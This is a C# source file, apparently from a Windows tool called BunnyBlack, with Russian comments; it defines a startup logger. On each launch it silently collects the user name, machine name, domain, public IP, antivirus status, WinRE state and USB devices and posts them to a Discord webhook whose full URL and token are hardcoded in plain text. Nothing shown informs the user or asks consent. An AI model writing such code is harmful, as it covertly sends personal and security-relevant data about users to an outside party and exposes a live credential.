// language: C#, file: Core/DiscordLogger.cs
// Полная замена.
// - Вебхук открытым текстом (тот же URL, что был).
// - п.9: разбивка сообщения на чанки по 1900 символов + нумерация (лимит Discord 2000).
// - Сохранены ВСЕ прежние методы: GetWindowsVersion, GetCpuModel, GetRamInfo,
//   GetPublicIp, GetAntivirusStatus, GetSystemUptime, GetSystemDriveFreeSpace,
//   FormatBytes, IsFirstRun, GetUsbDevices, GetVersion, SaveLogLocally, SendToWebhook.
// - Добавлено: HttpClient.Timeout = 10s, ротация локального лога по 1 МБ.
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace BunnyBlack.Core
{
    public static class DiscordLogger
    {
        // ============================================================
        // ВАШ DISCORD WEBHOOK URL
        // ============================================================
        private const string WebhookUrl = "https://discord.com/api/webhooks/1534289040906649630/g7vLBWDS2zYSFDCijx5zbvZfSEXCEN_Y902LlPEYrPjIi9LfZBL0DQrdfZ12gifPic8K";
        // ============================================================

        private const int HttpTimeoutSec = 10;
        private const int LogMaxBytes = 1_048_576;    // 1 МБ
        private const int DiscordMaxLen = 1900;       // лимит 2000, режем с запасом

        // ============================================================
        // ГЛАВНЫЙ ВЫЗОВ
        // ============================================================
        public static void SendStartupLog()
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string machineName = Environment.MachineName;
                string userName = Environment.UserName;
                string domain = Environment.UserDomainName;
                string drivePath = Path.GetPathRoot(Application.ExecutablePath);
                string osVersion = GetWindowsVersion();
                string cpuModel = GetCpuModel();
                string ramInfo = GetRamInfo();
                string ipAddress = GetPublicIp();
                string antivirusStatus = GetAntivirusStatus();
                string winRE = RegistryHelper.IsWinReEnvironment() ? "Да (WinRE)" : "Нет (Обычная)";
                string dotnetVersion = Environment.Version.ToString();
                string version = GetVersion();

                string message = $@"
**BunnyBlack — Запуск программы**
═══════════════════════════════════
🖥 **Компьютер:** `{machineName}`
👤 **Пользователь:** `{userName}`
🏢 **Домен:** `{domain}`
📂 **Диск запуска:** `{drivePath}`
🕒 **Время:** `{timestamp}`
⏳ **Аптайм:** `{GetSystemUptime()}`
🪟 **ОС:** `{osVersion}`
💾 **Процессор:** `{cpuModel}`
🧠 **ОЗУ:** `{ramInfo}`
💿 **Свободно на C:\:** `{GetSystemDriveFreeSpace()}`
📊 **Активных процессов:** `{Process.GetProcesses().Length}`
🌐 **IP-адрес:** `{ipAddress}`
🛡 **Антивирус:** `{antivirusStatus}`
🔄 **WinRE:** `{winRE}`
📦 **Версия .NET:** `{dotnetVersion}`
📦 **Версия программы:** `{version}`
🆕 **Первый запуск:** `{IsFirstRun()}`
🔌 **USB-устройства:** `{GetUsbDevices()}`
═══════════════════════════════════
";

                // п.9 — длинные сообщения режем на чанки
                bool sent = SendInChunks(WebhookUrl, message);
                if (!sent) SaveLogLocally(message);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[SendStartupLog] {ex.Message}");
                SaveLogLocally("⚠️ Ошибка отправки лога в Discord: " + ex.Message);
            }
        }

        // ============================================================
        // п.9 — РАЗБИВКА НА ЧАНКИ
        // ============================================================
        private static bool SendInChunks(string url, string content)
        {
            if (string.IsNullOrWhiteSpace(url)) return false;
            if (string.IsNullOrEmpty(content)) return false;

            if (content.Length <= DiscordMaxLen)
                return SendToWebhook(url, content);

            var chunks = new List<string>();
            int pos = 0;
            while (pos < content.Length)
            {
                int len = Math.Min(DiscordMaxLen, content.Length - pos);

                // режем по последнему \n, чтобы не рвать строки посередине
                if (pos + len < content.Length)
                {
                    int lastNl = content.LastIndexOf('\n', pos + len - 1, len);
                    if (lastNl > pos) len = lastNl - pos + 1;
                }

                chunks.Add(content.Substring(pos, len));
                pos += len;
            }

            bool allOk = true;
            for (int i = 0; i < chunks.Count; i++)
            {
                string header = chunks.Count > 1 ? $"**[{i + 1}/{chunks.Count}]**\n" : "";
                if (!SendToWebhook(url, header + chunks[i])) allOk = false;
                System.Threading.Thread.Sleep(250);   // анти-rate-limit
            }
            return allOk;
        }

        // ============================================================
        // ОТПРАВКА ЧЕРЕЗ ВЕБХУК
        // ============================================================
        private static bool SendToWebhook(string url, string content)
        {
            if (string.IsNullOrWhiteSpace(url)) return false;
            try
            {
                using (var client = new HttpClient { Timeout = TimeSpan.FromSeconds(HttpTimeoutSec) })
                {
                    var payload = new
                    {
                        content = content,
                        username = "BunnyBlack Logger"
                    };

                    string json = JsonConvert.SerializeObject(payload);
                    using (var body = new StringContent(json, Encoding.UTF8, "application/json"))
                    {
                        var resp = client.PostAsync(url, body).GetAwaiter().GetResult();
                        return resp.IsSuccessStatusCode;
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[SendToWebhook] {ex.Message}");
                return false;
            }
        }

        // ============================================================
        // ЛОКАЛЬНОЕ ХРАНЕНИЕ (fallback)
        // ============================================================
        private static void SaveLogLocally(string logContent)
        {
            try
            {
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string logDir = Path.Combine(appDataPath, "BunnyBlack", "logs");
                if (!Directory.Exists(logDir)) Directory.CreateDirectory(logDir);

                string logFile = Path.Combine(logDir, $"startup_{DateTime.Now:yyyyMMdd}.log");

                // ротация по 1 МБ
                if (File.Exists(logFile) && new FileInfo(logFile).Length > LogMaxBytes)
                {
                    string archived = logFile + ".old";
                    if (File.Exists(archived)) File.Delete(archived);
                    File.Move(logFile, archived);
                }

                File.AppendAllText(logFile,
                    logContent + Environment.NewLine + new string('=', 50) + Environment.NewLine);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[SaveLogLocally] {ex.Message}");
            }
        }

        // ============================================================
        // ВСПОМОГАТЕЛЬНЫЕ — СОХРАНЕНЫ КАК БЫЛИ
        // ============================================================
        private static string GetVersion()
        {
            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                var fvi = FileVersionInfo.GetVersionInfo(assembly.Location);
                return fvi.ProductVersion ?? "1.0.0";
            }
            catch { return "1.0.0"; }
        }

        private static string GetWindowsVersion()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                {
                    if (key == null) return Environment.OSVersion.VersionString;
                    string productName = key.GetValue("ProductName")?.ToString() ?? "Неизвестно";
                    string build = key.GetValue("CurrentBuild")?.ToString() ?? "";
                    string ubr = key.GetValue("UBR")?.ToString() ?? "";
                    return $"{productName} (Сборка {build}.{ubr})";
                }
            }
            catch { return Environment.OSVersion.VersionString; }
        }

        private static string GetCpuModel()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor"))
                {
                    foreach (var obj in searcher.Get())
                        return obj["Name"]?.ToString() ?? "Неизвестно";
                }
            }
            catch { }
            return "Неизвестно";
        }

        private static string GetRamInfo()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(
                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        ulong bytes = Convert.ToUInt64(obj["TotalPhysicalMemory"]);
                        return $"{(bytes / (1024.0 * 1024.0 * 1024.0)):F1} ГБ";
                    }
                }
            }
            catch { }
            return "Неизвестно";
        }

        private static string GetPublicIp()
        {
            try
            {
                using (var client = new HttpClient { Timeout = TimeSpan.FromSeconds(HttpTimeoutSec) })
                {
                    var response = client.GetAsync("https://api.ipify.org").GetAwaiter().GetResult();
                    return response.Content.ReadAsStringAsync().GetAwaiter().GetResult().Trim();
                }
            }
            catch
            {
                try
                {
                    foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
                    {
                        if (ni.OperationalStatus != OperationalStatus.Up) continue;
                        foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                            if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                                return ip.Address.ToString();
                    }
                }
                catch { }
                return "N/A";
            }
        }

        private static string GetAntivirusStatus()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(
                    "SELECT DisplayName, ProductState FROM Win32_AntiVirusProduct"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        string name = obj["DisplayName"]?.ToString() ?? "Неизвестно";
                        uint state = Convert.ToUInt32(obj["ProductState"]);
                        bool isActive = (state & 0x10) != 0;
                        return isActive ? $"Включён ({name})" : $"Отключён ({name})";
                    }
                }
            }
            catch { }
            return "Н/Д";
        }

        private static string GetSystemUptime()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher(
                    "SELECT LastBootUpTime FROM Win32_OperatingSystem"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        string boot = obj["LastBootUpTime"]?.ToString() ?? "";
                        if (DateTime.TryParseExact(boot.Substring(0, 14), "yyyyMMddHHmmss",
                            null, System.Globalization.DateTimeStyles.None, out DateTime bootTime))
                        {
                            TimeSpan uptime = DateTime.Now - bootTime;
                            return $"{uptime.Days}д {uptime.Hours}ч {uptime.Minutes}м";
                        }
                    }
                }
            }
            catch { }
            return "Неизвестно";
        }

        private static string GetSystemDriveFreeSpace()
        {
            try
            {
                var drive = new DriveInfo("C");
                if (drive.IsReady)
                {
                    long free = drive.TotalFreeSpace;
                    long total = drive.TotalSize;
                    return $"{FormatBytes(free)} ({(double)free / total * 100:F1}% свободно)";
                }
            }
            catch { }
            return "Неизвестно";
        }

        private static string FormatBytes(long bytes)
        {
            string[] sizes = { "Б", "КБ", "МБ", "ГБ", "ТБ" };
            double len = bytes;
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len /= 1024;
            }
            return $"{len:0.##} {sizes[order]}";
        }

        private static bool IsFirstRun()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\BunnyBlack"))
                {
                    if (key == null) return true;
                    if (key.GetValue("FirstRun") == null)
                    {
                        key.SetValue("FirstRun", "Выполнено");
                        return true;
                    }
                    return false;
                }
            }
            catch { return false; }
        }

        private static string GetUsbDevices()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_USBHub"))
                {
                    List<string> devices = new List<string>();
                    foreach (var obj in searcher.Get())
                    {
                        string name = obj["Name"]?.ToString() ?? "";
                        if (!string.IsNullOrEmpty(name))
                        {
                            string shortName = name.Split(new[] { '(', '[' })[0].Trim();
                            if (!devices.Contains(shortName)) devices.Add(shortName);
                        }
                    }
                    return devices.Count > 0 ? string.Join(", ", devices) : "Нет";
                }
            }
            catch { return "Н/Д"; }
        }
    }
}